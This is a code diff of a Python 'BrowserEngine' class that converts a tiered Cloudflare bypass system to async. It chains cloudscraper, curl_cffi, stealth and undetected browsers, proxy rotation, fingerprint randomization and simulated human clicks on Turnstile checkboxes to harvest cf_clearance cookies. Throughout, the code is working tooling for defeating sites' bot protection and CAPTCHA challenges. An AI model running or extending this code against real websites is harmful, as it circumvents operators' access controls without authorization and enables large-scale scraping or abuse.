@@ -1983,10 +1983,11 @@ class BrowserEngine:
         ])
 
     @staticmethod
-    def _solve_tier1a_cloudscraper(url: str, proxy: str = None, user_agent: str = None, timeout: int = 15):
+    async def _solve_tier1a_cloudscraper(url: str, proxy: str = None, user_agent: str = None, timeout: int = 15):
         """Tier 1a: cloudscraper - Ultra-lightweight HTTP request bypasser for weak WAF configs."""
         try:
             import cloudscraper
+            import asyncio
             scraper = cloudscraper.create_scraper(
                 browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
             )
@@ -1998,7 +1999,7 @@ class BrowserEngine:
                 scraper.headers.update({"User-Agent": user_agent})
 
             start_time = time()
-            res = scraper.get(url, timeout=timeout)
+            res = await asyncio.to_thread(scraper.get, url, timeout=timeout)
             
             # Extract cf_clearance cookie
             cookie_str = ""
@@ -2019,23 +2020,23 @@ class BrowserEngine:
             if BrowserEngine._cf_challenge_active(res):
                 return None, None
                 
-            BypassDebugger.capture_failure("Tier 1a (Cloudscraper)", url, response=res, error_msg="No cf_clearance cookie found")
+            BypassDebugger.capture_failure("Tier 1a (Cloudscraper)", url, response_obj=res, error_msg="No cf_clearance cookie found")
         except Exception as e:
             BypassDebugger.capture_failure("Tier 1a (Cloudscraper)", url, error_msg=str(e))
         return None, None
 
     @staticmethod
-    def _solve_tier1_lightweight(url: str, proxy: str = None, user_agent: str = None, timeout: int = 15):
+    async def _solve_tier1_lightweight(url: str, proxy: str = None, user_agent: str = None, timeout: int = 15):
         # 1b. curl_cffi
         if CURL_CFFI_INSTALLED:
             try:
-                from curl_cffi.requests import Session as CurlSyncSession
+                from curl_cffi.requests import AsyncSession
                 profile = BrowserEngine.get_curl_profile(user_agent)
-                with CurlSyncSession(impersonate=profile) as cs:
+                async with AsyncSession(impersonate=profile) as cs:
                     if proxy:
                         p_url = f"http://{proxy}" if "://" not in proxy else proxy
                         cs.proxies = {"http": p_url, "https": p_url}
-                    resp = cs.get(url, timeout=timeout, allow_redirects=True)
+                    resp = await cs.get(url, timeout=timeout, allow_redirects=True)
                     if resp.status_code < 403:
                         cookie_str = "; ".join([f"{k}={v}" for k, v in resp.cookies.items()])
                         if "cf_clearance" in cookie_str:
@@ -2049,16 +2050,16 @@ class BrowserEngine:
         return None, None
 
     @staticmethod
-    def _solve_tier2_fast_cdp(url: str, proxy: str = None, user_agent: str = None, timeout: int = 15):
+    async def _solve_tier2_fast_cdp(url: str, proxy: str = None, user_agent: str = None, timeout: int = 15):
         # --- Pre-flight Proxy Check ---
         if proxy and CURL_CFFI_INSTALLED:
             try:
-                from curl_cffi.requests import Session as CurlSyncSession
-                with CurlSyncSession(impersonate="chrome110") as cs:
+                from curl_cffi.requests import AsyncSession
+                async with AsyncSession(impersonate="chrome110") as cs:
                     p_url = f"http://{proxy}" if "://" not in proxy else proxy
                     cs.proxies = {"http": p_url, "https": p_url}
                     # Quick check to ensure proxy can at least connect
-                    cs.head(url, timeout=5, allow_redirects=True)
+                    await cs.head(url, timeout=5, allow_redirects=True)
             except Exception as e:
                 err_str = str(e).lower()
                 if "timeout" in err_str or "proxy" in err_str or "connect" in err_str or "failed" in err_str:
@@ -2070,12 +2071,13 @@ class BrowserEngine:
         # 2a. Botasaurus
         if BOTASAURUS_INSTALLED:
             try:
+                import asyncio
                 from botasaurus.browser import browser, Driver
                 def get_proxy(data): return data.get("proxy")
                 
                 # Using block_images=True instead of block_images_and_css so Cloudflare/Turnstile
                 # shadow root challenge elements retain CSS height styling (preventing 'no height' errors)
-                @browser(proxy=get_proxy, block_images=True, headless=True, close_on_crash=True)
+                @browser(proxy=get_proxy, block_images=True, headless=False, close_on_crash=True)
                 def bot_solve(driver: Driver, data):
                     try:
                         driver.google_get(data["url"], bypass_cloudflare=True)
@@ -2088,7 +2090,7 @@ class BrowserEngine:
                         BypassDebugger.capture_failure("Tier 2 (Botasaurus)", data["url"], page_obj=driver, error_msg=str(e))
                     return None, None
                 
-                res = bot_solve([{"url": url, "proxy": proxy}])
+                res = await asyncio.to_thread(bot_solve, [{"url": url, "proxy": proxy}])
                 if res and res[0] and res[0][0]:
                     return res[0][0], res[0][1]
             except Exception as e:
@@ -2153,18 +2155,11 @@ class BrowserEngine:
                     return None, None
                 
                 try:
-                    import threading
-                    result = [None, None]
-                    def _run_nd_thread():
-                        result[0], result[1] = asyncio.run(_nd_solve())
-                    t = threading.Thread(target=_run_nd_thread)
-                    t.start()
-                    t.join()
-                    cookie, ua = result
+                    cookie, ua = await _nd_solve()
                     if cookie: return cookie, ua
                 except Exception as e:
                     import logging
-                    logging.error(f"Tier 2 (Nodriver) thread runner exception: {e}")
+                    logging.error(f"Tier 2 (Nodriver) exception: {e}")
                     pass
             except Exception as e:
                 import logging
@@ -2174,81 +2169,85 @@ class BrowserEngine:
         # 2c. DrissionPage
         if DRISSION_INSTALLED:
             try:
+                import asyncio
                 from DrissionPage import ChromiumPage, ChromiumOptions
                 from random import randint
                 from time import sleep, time as _time
-                co = ChromiumOptions()
-                co.auto_port()
-                co.set_argument('--headless=new')
-                co.set_argument('--disable-blink-features=AutomationControlled')
-                if proxy:
-                    p_url = f"http://{proxy}" if "://" not in proxy else proxy
-                    co.set_argument(f'--proxy-server={p_url}')
-                page = ChromiumPage(co)
-                try:
-                    page.get(url, timeout=timeout)
-                    
-                    # PROXY FAST-FAIL DOM CHECK
+                def _run_dp():
+                    co = ChromiumOptions()
+                    co.auto_port()
+                    co.set_argument('--headless=new')
+                    co.set_argument('--disable-blink-features=AutomationControlled')
+                    if proxy:
+                        p_url = f"http://{proxy}" if "://" not in proxy else proxy
+                        co.set_argument(f'--proxy-server={p_url}')
+                    page = ChromiumPage(co)
                     try:
-                        html_content = page.html
-                        if html_content and any(err in html_content for err in ["ERR_PROXY_CONNECTION_FAILED", "ERR_TUNNEL_CONNECTION_FAILED", "ERR_SOCKS_CONNECTION_FAILED", "ERR_CONNECTION_CLOSED", "ERR_CONNECTION_RESET"]):
-                            logger.warning(f"{bcolors.WARNING}[!] Tier 2 DrissionPage proxy failure detected in DOM. Evicting proxy {proxy}.{bcolors.RESET}")
-                            if proxy:
-                                BrowserEngine._get_waterfall_pcb().record_failure(proxy)
-                            BypassDebugger.capture_failure("Tier 2 (DrissionPage)", url, page_obj=page, error_msg="Proxy connection failed (DOM check)")
-                            return None, None
-                    except Exception:
-                        pass
+                        page.get(url, timeout=timeout)
                         
-                    start_t = _time()
-                    pulse = 0
-                    while (_time() - start_t) < timeout:
-                        sleep(0.5)
-                        pulse += 1
+                        # PROXY FAST-FAIL DOM CHECK
+                        try:
+                            html_content = page.html
+                            if html_content and any(err in html_content for err in ["ERR_PROXY_CONNECTION_FAILED", "ERR_TUNNEL_CONNECTION_FAILED", "ERR_SOCKS_CONNECTION_FAILED", "ERR_CONNECTION_CLOSED", "ERR_CONNECTION_RESET"]):
+                                logger.warning(f"{bcolors.WARNING}[!] Tier 2 DrissionPage proxy failure detected in DOM. Evicting proxy {proxy}.{bcolors.RESET}")
+                                if proxy:
+                                    BrowserEngine._get_waterfall_pcb().record_failure(proxy)
+                                BypassDebugger.capture_failure("Tier 2 (DrissionPage)", url, page_obj=page, error_msg="Proxy connection failed (DOM check)")
+                                return None, None
+                        except Exception:
+                            pass
+                            
+                        start_t = _time()
+                        pulse = 0
+                        while (_time() - start_t) < timeout:
+                            sleep(0.5)
+                            pulse += 1
+                            cookies = page.cookies()
+                            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
+                            if "cf_clearance" in cookie_str:
+                                break
+                            
+                            if pulse % 3 == 0:
+                                human_mouse_move(page, randint(50, 950), randint(50, 750))
+                                try:
+                                    found = False
+                                    for sel in ["input[type='checkbox']", "#challenge-stage", ".ctp-checkbox-container"]:
+                                        ele = page.ele(sel, timeout=0.1)
+                                        if ele:
+                                            ele.click(by_js=True)
+                                            found = True
+                                            break
+                                    
+                                    if not found:
+                                        all_inputs = page.eles("tag:input")
+                                        for input_elem in all_inputs:
+                                            name = input_elem.attr("name")
+                                            if name and "turnstile" in name.lower():
+                                                parent = input_elem.parent()
+                                                if parent and parent.shadow_root:
+                                                    for child in parent.shadow_root.children():
+                                                        if child.tag == "iframe":
+                                                            iframe_body = child("tag:body")
+                                                            if iframe_body and iframe_body.shadow_root:
+                                                                checkbox = iframe_body.shadow_root("tag:input")
+                                                                if checkbox:
+                                                                    checkbox.click(by_js=True)
+                                                                    break
+                                except Exception:
+                                    pass
+                            
                         cookies = page.cookies()
                         cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                         if "cf_clearance" in cookie_str:
-                            break
-                        
-                        if pulse % 3 == 0:
-                            human_mouse_move(page, randint(50, 950), randint(50, 750))
-                            try:
-                                found = False
-                                for sel in ["input[type='checkbox']", "#challenge-stage", ".ctp-checkbox-container"]:
-                                    ele = page.ele(sel, timeout=0.1)
-                                    if ele:
-                                        ele.click(by_js=True)
-                                        found = True
-                                        break
-                                
-                                if not found:
-                                    all_inputs = page.eles("tag:input")
-                                    for input_elem in all_inputs:
-                                        name = input_elem.attr("name")
-                                        if name and "turnstile" in name.lower():
-                                            parent = input_elem.parent()
-                                            if parent and parent.shadow_root:
-                                                for child in parent.shadow_root.children():
-                                                    if child.tag == "iframe":
-                                                        iframe_body = child("tag:body")
-                                                        if iframe_body and iframe_body.shadow_root:
-                                                            checkbox = iframe_body.shadow_root("tag:input")
-                                                            if checkbox:
-                                                                checkbox.click(by_js=True)
-                                                                break
-                            except Exception:
-                                pass
-                        
-                    cookies = page.cookies()
-                    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
-                    if "cf_clearance" in cookie_str:
-                        ua = page.run_js("return navigator.userAgent")
-                        return cookie_str, ua
-                    BypassDebugger.capture_failure("Tier 2 (DrissionPage)", url, page_obj=page, error_msg="Challenge not solved")
-                except Exception as e:
-                    BypassDebugger.capture_failure("Tier 2 (DrissionPage)", url, page_obj=page, error_msg=str(e))
-                finally:
-                    page.quit()
+                            ua = page.run_js("return navigator.userAgent")
+                            return cookie_str, ua
+                        BypassDebugger.capture_failure("Tier 2 (DrissionPage)", url, page_obj=page, error_msg="Challenge not solved")
+                    except Exception as e:
+                        BypassDebugger.capture_failure("Tier 2 (DrissionPage)", url, page_obj=page, error_msg=str(e))
+                    finally:
+                        page.quit()
+                    return None, None
+                return await asyncio.to_thread(_run_dp)
             except Exception:
                 pass
 
@@ -2256,17 +2255,38 @@ class BrowserEngine:
 
     _FIND_CHECKBOX_JS = """
 (() => {
-    const selectors = ["input[type='checkbox']", ".ctp-checkbox-container", "#challenge-stage", "#turnstile-wrapper"];
-    for (const sel of selectors) {
-        let el = document.querySelector(sel);
-        if (!el && document.body && document.body.shadowRoot) {
-            el = document.body.shadowRoot.querySelector(sel);
+    function findElement(root, selectors) {
+        for (const sel of selectors) {
+            const el = root.querySelector(sel);
+            if (el) return el;
         }
-        if (el) {
-            const rect = el.getBoundingClientRect();
-            if (rect.width > 0 && rect.height > 0) {
-                return { found: true, checked: el.checked || false, x: rect.left + rect.width / 2, y: rect.top + rect.height / 2, w: rect.width };
+        const allElements = root.querySelectorAll('*');
+        for (const el of allElements) {
+            if (el.shadowRoot) {
+                const found = findElement(el.shadowRoot, selectors);
+                if (found) return found;
             }
+        }
+        return null;
+    }
+    const selectors = [".ctp-checkbox-label", ".ctp-checkbox-container", "input[type='checkbox']", "#challenge-stage", "#turnstile-wrapper", ".mark", ".nmqB4", ".cbGy7", "input"];
+    let el = findElement(document, selectors);
+
+    // Fallback for Cloudflare challenge iframe
+    if (!el && window.location.href.includes('challenges.cloudflare.com')) {
+        el = document.body;
+    }
+
+    if (el) {
+        const rect = el.getBoundingClientRect();
+        if (rect.width > 0 && rect.height > 0) {
+            // Put a red border around it so we can see it in screenshot
+            el.style.border = "2px solid red";
+            if (el === document.body) {
+                // If we fallback to body, the checkbox is usually on the left
+                return { found: true, fallback: true, checked: false, x: 30, y: rect.height / 2, w: rect.width };
+            }
+            return { found: true, checked: el.checked || false, x: rect.left + rect.width / 2, y: rect.top + rect.height / 2, w: rect.width };
         }
     }
     return { found: false };
@@ -2277,39 +2297,78 @@ class BrowserEngine:
     def _click_turnstile_checkbox_precision(page) -> bool:
         """Finds Turnstile checkbox inside shadow DOM across all frames and clicks exact coordinates."""
         try:
+            import time, random
             for frame in page.frames:
-                if "cloudflare" in frame.url.lower() or "turnstile" in frame.url.lower() or "challenges" in frame.url.lower():
-                    try:
-                        res = frame.evaluate(BrowserEngine._FIND_CHECKBOX_JS)
-                        if res and isinstance(res, dict) and res.get("found"):
-                            if not res.get("checked", False):
-                                try:
-                                    f_elem = frame.frame_element()
-                                    box = f_elem.bounding_box()
-                                    if box:
-                                        page.mouse.click(box["x"] + res["x"], box["y"] + res["y"])
-                                        return True
-                                except Exception:
-                                    page.mouse.click(res["x"], res["y"])
-                                    return True
-                    except Exception:
-                        pass
+                try:
+                    if "challenges.cloudflare.com" in frame.url:
+                        f_elem = frame.frame_element()
+                        box = f_elem.bounding_box()
+                        if box and box["width"] > 0 and box["height"] > 0:
+                            # The checkbox is usually on the left side, approx 30px from left.
+                            abs_x = box["x"] + 30 + random.uniform(-3, 3)
+                            abs_y = box["y"] + (box["height"] / 2) + random.uniform(-3, 3)
+                            logger.debug(f"[Turnstile] Clicking frame {frame.url} bounding box at {abs_x}, {abs_y}")
+                            
+                            # Move mouse smoothly to destination
+                            page.mouse.move(abs_x, abs_y, steps=10)
+                            time.sleep(random.uniform(0.1, 0.3))
+                            
+                            page.mouse.down()
+                            time.sleep(random.uniform(0.05, 0.15))
+                            page.mouse.up()
+                            
+                            # Random follow-up movement
+                            page.mouse.move(abs_x + random.uniform(50, 100), abs_y + random.uniform(50, 100), steps=5)
+                            logger.debug(f"[Turnstile] Click complete")
+                            return True
+                except Exception:
+                    pass
         except Exception:
             pass
         return False
 
     @staticmethod
+    async def _click_turnstile_checkbox_precision_async(page) -> bool:
+        """Async version of Turnstile checkbox clicker."""
+        try:
+            import asyncio, random
+            for frame in page.frames:
+                try:
+                    if "challenges.cloudflare.com" in frame.url:
+                        f_elem = await frame.frame_element()
+                        box = await f_elem.bounding_box()
+                        if box and box["width"] > 0 and box["height"] > 0:
+                            abs_x = box["x"] + 30 + random.uniform(-3, 3)
+                            abs_y = box["y"] + (box["height"] / 2) + random.uniform(-3, 3)
+                            logger.debug(f"[Turnstile] Clicking frame {frame.url} bounding box at {abs_x}, {abs_y}")
+                            
+                            await page.mouse.move(abs_x, abs_y, steps=10)
+                            await asyncio.sleep(random.uniform(0.1, 0.3))
+                            
+                            await page.mouse.down()
+                            await asyncio.sleep(random.uniform(0.05, 0.15))
+                            await page.mouse.up()
+                            
+                            await page.mouse.move(abs_x + random.uniform(50, 100), abs_y + random.uniform(50, 100), steps=5)
+                            logger.debug(f"[Turnstile] Click complete")
+                            return True
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        return False
+
     @staticmethod
-    def _solve_tier3_heavy_stealth(url: str, proxy: str = None, user_agent: str = None, timeout: int = 30):
+    async def _solve_tier3_heavy_stealth(url: str, proxy: str = None, user_agent: str = None, timeout: int = 30):
         # --- Pre-flight Proxy Check ---
         if proxy and CURL_CFFI_INSTALLED:
             try:
-                from curl_cffi.requests import Session as CurlSyncSession
-                with CurlSyncSession(impersonate="chrome110") as cs:
+                from curl_cffi.requests import AsyncSession
+                async with AsyncSession(impersonate="chrome110") as cs:
                     p_url = f"http://{proxy}" if "://" not in proxy else proxy
                     cs.proxies = {"http": p_url, "https": p_url}
                     # Quick check to ensure proxy can at least connect
-                    cs.head(url, timeout=5, allow_redirects=True)
+                    await cs.head(url, timeout=5, allow_redirects=True)
             except Exception as e:
                 err_str = str(e).lower()
                 if "timeout" in err_str or "proxy" in err_str or "connect" in err_str or "failed" in err_str:
@@ -2321,38 +2380,55 @@ class BrowserEngine:
         if CLOAKBROWSER_INSTALLED:
             try:
                 import random
+                import asyncio
+                from cloakbrowser.async_api import cloakbrowser_launch_async
                 p_url = f"http://{proxy}" if proxy and "://" not in proxy else proxy
                 
-                # Use humanize and geoip for maximum stealth
-                browser = cloakbrowser_launch(
+                # Use humanize and disable geoip to prevent hangs on Windows
+                browser = await cloakbrowser_launch_async(
                     headless=True, 
                     humanize=True, 
-                    geoip=True if proxy else False,
+                    geoip=False,
                     proxy=p_url
                 )
                 try:
-                    context = browser.new_context(user_agent=user_agent) if user_agent else browser.new_context()
-                    page = context.new_page()
+                    logger.debug(f"[Tier 3] Creating new context and page...")
+                    context = await browser.new_context(user_agent=user_agent) if user_agent else await browser.new_context()
+                    page = await context.new_page()
                     try:
-                        page.goto(url, timeout=timeout * 1000)
+                        logger.debug(f"[Tier 3] Navigating to {url} with timeout {timeout*1000}ms...")
+                        await page.goto(url, wait_until="domcontentloaded", timeout=timeout * 1000)
+                        logger.debug(f"[Tier 3] Navigation complete.")
                         
-                        from time import sleep, time as _time
+                        # PROXY FAST-FAIL DOM CHECK
+                        try:
+                            html_content = await page.content()
+                            if html_content and any(err in html_content for err in ["ERR_PROXY_CONNECTION_FAILED", "ERR_TUNNEL_CONNECTION_FAILED", "ERR_SOCKS_CONNECTION_FAILED", "ERR_CONNECTION_CLOSED", "ERR_CONNECTION_RESET"]):
+                                logger.warning(f"{bcolors.WARNING}[!] Tier 3 (CloakBrowser) proxy failure detected in DOM. Evicting proxy {proxy}.{bcolors.RESET}")
+                                if proxy:
+                                    BrowserEngine._get_waterfall_pcb().record_failure(proxy)
+                                BypassDebugger.capture_failure("Tier 3 (CloakBrowser)", url, page_obj=page, error_msg="Proxy connection failed (DOM check)")
+                                return None, None
+                        except Exception:
+                            pass
+                        
+                        from time import time as _time
                         start_t = _time()
                         loop_idx = 0
                         while (_time() - start_t) < timeout:
-                            sleep(0.5)
+                            await asyncio.sleep(0.5)
                             loop_idx += 1
-                            cookies = context.cookies()
+                            cookies = await context.cookies()
                             cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                             if "cf_clearance" in cookie_str:
-                                ua = page.evaluate("navigator.userAgent")
+                                ua = await page.evaluate("navigator.userAgent")
                                 return cookie_str, ua
                             
                             if loop_idx % 3 == 0:
-                                BrowserEngine._click_turnstile_checkbox_precision(page)
+                                await BrowserEngine._click_turnstile_checkbox_precision_async(page)
                                 try:
-                                    human_mouse_move(page, random.randint(100, 500), random.randint(100, 500))
-                                    page.mouse.wheel(0, random.randint(100, 300))
+                                    await page.mouse.move(random.randint(100, 500), random.randint(100, 500))
+                                    await page.mouse.wheel(0, random.randint(100, 300))
                                 except: pass
                         BypassDebugger.capture_failure("Tier 3 (CloakBrowser)", url, page_obj=page, error_msg="Challenge not solved")
                     except Exception as e:
@@ -2365,45 +2441,59 @@ class BrowserEngine:
                             
                         BypassDebugger.capture_failure("Tier 3 (CloakBrowser)", url, page_obj=page, error_msg=str(e))
                 finally:
-                    browser.close()
+                    await browser.close()
             except Exception as e:
                 BypassDebugger.capture_failure("Tier 3 (CloakBrowser-Launch)", url, error_msg=str(e))
 
         # 3b. Patchright (Stealth Playwright)
         if PATCHRIGHT_INSTALLED:
             try:
-                from patchright.sync_api import sync_playwright
-                with sync_playwright() as p:
-                    browser = p.chromium.launch(headless=True)
+                from patchright.async_api import async_playwright
+                import asyncio
+                async with async_playwright() as p:
+                    browser = await p.chromium.launch(headless=True)
                     try:
                         context_kwargs = {"user_agent": user_agent} if user_agent else {}
                         if proxy:
                             p_url = f"http://{proxy}" if "://" not in proxy else proxy
                             context_kwargs["proxy"] = {"server": p_url}
                         
-                        context = browser.new_context(**context_kwargs)
-                        page = context.new_page()
-                        page.goto(url, timeout=timeout * 1000)
-                        from time import sleep, time as _time
+                        context = await browser.new_context(**context_kwargs)
+                        page = await context.new_page()
+                        await page.goto(url, wait_until="domcontentloaded", timeout=timeout * 1000)
+                        
+                        # PROXY FAST-FAIL DOM CHECK
+                        try:
+                            html_content = await page.content()
+                            if html_content and any(err in html_content for err in ["ERR_PROXY_CONNECTION_FAILED", "ERR_TUNNEL_CONNECTION_FAILED", "ERR_SOCKS_CONNECTION_FAILED", "ERR_CONNECTION_CLOSED", "ERR_CONNECTION_RESET"]):
+                                logger.warning(f"{bcolors.WARNING}[!] Tier 3 (Patchright) proxy failure detected in DOM. Evicting proxy {proxy}.{bcolors.RESET}")
+                                if proxy:
+                                    BrowserEngine._get_waterfall_pcb().record_failure(proxy)
+                                BypassDebugger.capture_failure("Tier 3 (Patchright)", url, page_obj=page, error_msg="Proxy connection failed (DOM check)")
+                                return None, None
+                        except Exception:
+                            pass
+                        
+                        from time import time as _time
                         import random
                         start_t = _time()
                         loop_idx = 0
                         while (_time() - start_t) < timeout:
-                            sleep(0.5)
+                            await asyncio.sleep(0.5)
                             loop_idx += 1
-                            cookies = context.cookies()
+                            cookies = await context.cookies()
                             cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                             if "cf_clearance" in cookie_str:
                                 try:
-                                    actual_ua = page.evaluate("navigator.userAgent")
+                                    actual_ua = await page.evaluate("navigator.userAgent")
                                 except Exception:
                                     actual_ua = user_agent
                                 return cookie_str, actual_ua
                                 
                             if loop_idx % 3 == 0:
-                                BrowserEngine._click_turnstile_checkbox_precision(page)
+                                await BrowserEngine._click_turnstile_checkbox_precision_async(page)
                                 try:
-                                    human_mouse_move(page, random.randint(100, 500), random.randint(100, 500))
+                                    await page.mouse.move(random.randint(100, 500), random.randint(100, 500))
                                 except: pass
                         BypassDebugger.capture_failure("Tier 3 (Patchright)", url, page_obj=page, error_msg="Challenge not solved")
                     except Exception as e:
@@ -2417,27 +2507,42 @@ class BrowserEngine:
                         page_obj = page if 'page' in locals() else None
                         BypassDebugger.capture_failure("Tier 3 (Patchright)", url, page_obj=page_obj, error_msg=str(e))
                     finally:
-                        browser.close()
+                        await browser.close()
             except Exception as e:
                 BypassDebugger.capture_failure("Tier 3 (Patchright-Launch)", url, error_msg=str(e))
 
         # 3c. Undetected Chromedriver
         if UNDETECTED_CHROMEDRIVER_INSTALLED:
             try:
-                driver = _launch_uc_chrome(headless=True, proxy=proxy)
+                import asyncio
+                # we wrap this in asyncio.to_thread because uc doesn't have an async API
+                driver = await asyncio.to_thread(_launch_uc_chrome, headless=True, proxy=proxy)
                 try:
-                    driver.get(url)
+                    await asyncio.to_thread(driver.get, url)
+                    
+                    # PROXY FAST-FAIL DOM CHECK
+                    try:
+                        html_content = driver.page_source
+                        if html_content and any(err in html_content for err in ["ERR_PROXY_CONNECTION_FAILED", "ERR_TUNNEL_CONNECTION_FAILED", "ERR_SOCKS_CONNECTION_FAILED", "ERR_CONNECTION_CLOSED", "ERR_CONNECTION_RESET"]):
+                            logger.warning(f"{bcolors.WARNING}[!] Tier 3 (UC) proxy failure detected in DOM. Evicting proxy {proxy}.{bcolors.RESET}")
+                            if proxy:
+                                BrowserEngine._get_waterfall_pcb().record_failure(proxy)
+                            BypassDebugger.capture_failure("Tier 3 (UC)", url, page_obj=driver, error_msg="Proxy connection failed (DOM check)")
+                            return None, None
+                    except Exception:
+                        pass
+                        
                     from time import sleep, time as _time
                     import random
                     start_t = _time()
                     loop_idx = 0
                     while (_time() - start_t) < timeout:
-                        sleep(0.5)
+                        await asyncio.sleep(0.5)
                         loop_idx += 1
-                        cookies = driver.get_cookies()
+                        cookies = await asyncio.to_thread(driver.get_cookies)
                         cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                         if "cf_clearance" in cookie_str:
-                            ua = driver.execute_script("return navigator.userAgent")
+                            ua = await asyncio.to_thread(driver.execute_script, "return navigator.userAgent")
                             return cookie_str, ua
                     
                         if loop_idx % 3 == 0:
@@ -2455,61 +2560,70 @@ class BrowserEngine:
         return None, None
 
     @staticmethod
-    def _solve_tier4_ultimate_stealth(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45):
+    async def _solve_tier4_ultimate_stealth(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45):
         # 4a. Camoufox (Ultimate Stealth Firefox)
         if CAMOUFOX_INSTALLED:
             try:
-                from camoufox.sync_api import Camoufox
+                from camoufox.async_api import AsyncCamoufox
+                import asyncio
                 # Task 8: Randomly select OS fingerprint from curated pool per-launch.
                 # This prevents WAF systems from recognizing a static fingerprint signature.
                 _cf_os_preset = random.choice(BrowserEngine._CAMOUFOX_PRESETS)
                 camoufox_kwargs = {
-                    "headless": True,
+                    "headless": False,
                     "humanize": True,
-                    "fingerprint_preset": True,
+                    "fingerprint_preset": False,
                     "os": _cf_os_preset,
                 }
                 if proxy:
                     p_url = f"http://{proxy}" if "://" not in proxy else proxy
                     camoufox_kwargs["proxy"] = {"server": p_url}
+                    camoufox_kwargs["geoip"] = True
 
-                with Camoufox(**camoufox_kwargs) as browser:
-                    page = browser.new_page()
+                async with AsyncCamoufox(**camoufox_kwargs) as browser:
+                    page = await browser.new_page()
                     try:
-                        page.goto(url, wait_until="domcontentloaded", timeout=timeout * 1000)
-                        from time import sleep, time as _time
+                        await page.goto(url, wait_until="domcontentloaded", timeout=timeout * 1000)
+                        
+                        # PROXY FAST-FAIL DOM CHECK
+                        try:
+                            html_content = await page.content()
+                            if html_content and any(err in html_content for err in ["ERR_PROXY_CONNECTION_FAILED", "ERR_TUNNEL_CONNECTION_FAILED", "ERR_SOCKS_CONNECTION_FAILED", "ERR_CONNECTION_CLOSED", "ERR_CONNECTION_RESET"]):
+                                logger.warning(f"{bcolors.WARNING}[!] Tier 4 (Camoufox) proxy failure detected in DOM. Evicting proxy {proxy}.{bcolors.RESET}")
+                                if proxy:
+                                    BrowserEngine._get_waterfall_pcb().record_failure(proxy)
+                                BypassDebugger.capture_failure("Tier 4 (Camoufox)", url, page_obj=page, error_msg="Proxy connection failed (DOM check)")
+                                return None, None
+                        except Exception:
+                            pass
+                            
+                        from time import time as _time
                         # Note: 'import random' intentionally omitted here — already imported at module level.
                         # A local 'import random' inside this function body would shadow module-level random
                         # and cause UnboundLocalError for BrowserEngine._CAMOUFOX_PRESETS usage above.
                         start_t = _time()
                         loop_idx = 0
                         while (_time() - start_t) < timeout:
-                            sleep(0.5)
+                            await asyncio.sleep(0.5)
                             loop_idx += 1
-                            cookies = browser.contexts[0].cookies()
+                            cookies = await browser.contexts[0].cookies()
                             cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                             if "cf_clearance" in cookie_str:
-                                ua = page.evaluate("navigator.userAgent")
+                                ua = await page.evaluate("navigator.userAgent")
                                 return cookie_str, ua
 
                             if loop_idx % 3 == 0:
-                                BrowserEngine._click_turnstile_checkbox_precision(page)
-                                try:
-                                    human_mouse_move(page, random.randint(100, 500), random.randint(100, 500))
-                                    page.mouse.wheel(0, random.randint(100, 300))
-                                except: pass
+                                await BrowserEngine._click_turnstile_checkbox_precision_async(page)
                         BypassDebugger.capture_failure("Tier 4 (Camoufox)", url, page_obj=page, error_msg="Challenge not solved")
                     except Exception as e:
                         BypassDebugger.capture_failure("Tier 4 (Camoufox)", url, page_obj=page, error_msg=str(e))
-                    finally:
-                        pass # Camoufox context manager handles it
             except Exception as e:
                 BypassDebugger.capture_failure("Tier 4 (Camoufox-Launch)", url, error_msg=str(e))
 
         return None, None
 
     @staticmethod
-    def solve_cf(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45000):
+    async def solve_cf(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45000):
         # 1. Check cache
         cache_file = get_data_path() / "assets" / "token_cache.json"
         probed_timestamp = 0
@@ -2535,13 +2649,14 @@ class BrowserEngine:
                         probe_success = False
                         
                         if CURL_CFFI_INSTALLED:
-                            from curl_cffi.requests import Session as CurlSyncSession
+                            import asyncio
+                            from curl_cffi.requests import AsyncSession
                             profile = BrowserEngine.get_curl_profile(entry["ua"])
-                            with CurlSyncSession(impersonate=profile) as cs:
+                            async with AsyncSession(impersonate=profile) as cs:
                                 if proxy:
                                     p_url = f"http://{proxy}" if "://" not in proxy else proxy
                                     cs.proxies = {"http": p_url, "https": p_url}
-                                resp = cs.get(url, headers=probe_headers, timeout=10, allow_redirects=True)
+                                resp = await cs.get(url, headers=probe_headers, timeout=10, allow_redirects=True)
                                 if resp.status_code < 403:
                                     probe_success = True
                         else:
@@ -2549,7 +2664,9 @@ class BrowserEngine:
                             if proxy:
                                 p_url = f"http://{proxy}" if "://" not in proxy else proxy
                                 scraper.proxies = {"http": p_url, "https": p_url}
-                            resp = scraper.get(url, headers=probe_headers, timeout=10)
+                            import asyncio
+                            # Cloudscraper doesn't have an async API
+                            resp = await asyncio.to_thread(scraper.get, url, headers=probe_headers, timeout=10)
                             if resp.status_code < 403:
                                 probe_success = True
                         
@@ -2585,7 +2702,7 @@ class BrowserEngine:
             except Exception as e:
                 logger.debug(f"[*] Post-lock cache recheck error: {e}")
 
-            cookie, ua = BrowserEngine._solve_cf_internal(url, proxy, user_agent, timeout)
+            cookie, ua = await BrowserEngine._solve_cf_internal_async(url, proxy, user_agent, timeout)
 
             # 3. Save to cache inside lock
             if cookie:
@@ -2617,7 +2734,7 @@ class BrowserEngine:
             return cookie, ua
 
     @staticmethod
-    def _solve_cf_internal(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45000, tabs_till_verify: int = None):
+    async def _solve_cf_internal_async(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45000, tabs_till_verify: int = None):
         if not url.startswith("https://") and not url.startswith("http://"):
             url = "https://" + url
         elif url.startswith("http://"):
@@ -2641,40 +2758,58 @@ class BrowserEngine:
         _parallel_probe = getattr(ENGINE_STATE, "parallel_probe", False)
         if _parallel_probe and getattr(ENGINE_STATE, "flaresolverr_url", None):
             logger.info(f"{bcolors.OKCYAN}[*] Parallel Probe: Dispatching Tier 0 + Tier 1 concurrently...{bcolors.RESET}")
